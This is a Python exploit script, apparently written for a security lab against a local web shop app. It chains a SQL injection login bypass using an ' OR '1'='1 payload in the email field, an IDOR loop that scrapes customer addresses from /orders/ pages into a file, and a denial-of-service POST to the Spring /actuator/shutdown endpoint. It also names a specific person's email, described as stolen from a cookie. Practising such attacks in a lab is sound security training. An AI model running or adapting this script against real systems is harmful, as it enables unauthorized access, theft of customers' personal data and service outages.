import requests
from urllib.parse import urljoin

def exploit(base_url, target_email):
    
    sql_payload = f"{target_email}' OR '1'='1"
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    })
    
    # SQL INJECTION CWE-89
    print("SQL INJECTION")
    login_url = urljoin(base_url, "/login")
    login_data = {"email": sql_payload, "password": "anypass1234567", "rememberMe": "true"}
    
    # Execute 2 times 
    session.post(login_url, data=login_data, allow_redirects=True)
    response = session.post(login_url, data=login_data, allow_redirects=True)
    
    if response.status_code == 200 and "logout" in response.text.lower():
        print("SQL Injection succesful")
    else:
        print("SQL Injection Failed")
        return False
    
    # IDOR CWE-639
    print("\nIDOR Extracting Adresses...")
    unique_addresses = set()
    
    # Get first 100 orders
    for order_id in range(1, 100):
        order_url = urljoin(base_url, f"/orders/{order_id}")
        response = session.get(order_url)
        
        if response.status_code == 200:
            if '<label for="address" class="col-6 text-right">Address</label>' in response.text:
                start_index = response.text.find('Address</label>')
                if start_index != -1:
                    span_start = response.text.find('<span>', start_index)
                    if span_start != -1:
                        span_end = response.text.find('</span>', span_start)
                        if span_end != -1:
                            address = response.text[span_start + 6:span_end].strip()
                            if address and address not in unique_addresses:
                                unique_addresses.add(address)
    
    # Save adresses
    if unique_addresses:
        with open("addresses.txt", "w", encoding="utf-8") as f:
            for address in sorted(unique_addresses):
                f.write(f"- {address}\n")
        print(f"{len(unique_addresses)} addresses saved")
    else:
        print("Addresses not found")
    
    # DoS CWE-639
    print("\nDoS")
    
    shutdown_url = urljoin(base_url, "/actuator/shutdown")
    
    try:
        print("Trying to shut down the app")
        response = session.post(shutdown_url, timeout=5)
        
        if response.status_code == 200:
            print("DoS Succesful")
            
    except requests.exceptions.ConnectionError:
        print("DoS successful")
    except requests.exceptions.Timeout:
        print("DoS successful")
    except Exception as e:
        print(f"DoS failed")


    # Show addresses
    if unique_addresses:
        print(f"\n Addresses Extracted:")
        for i, address in enumerate(sorted(unique_addresses), 1):
            print(f"  {i}. {address}")
    
    return True


if __name__ == "__main__":
    base_url= "http://localhost:8888"
    # Stolen email from "Remember me" Cookie exploit 
    target_email= "aaron.cela@udc.es"
    exploit(base_url, target_email)
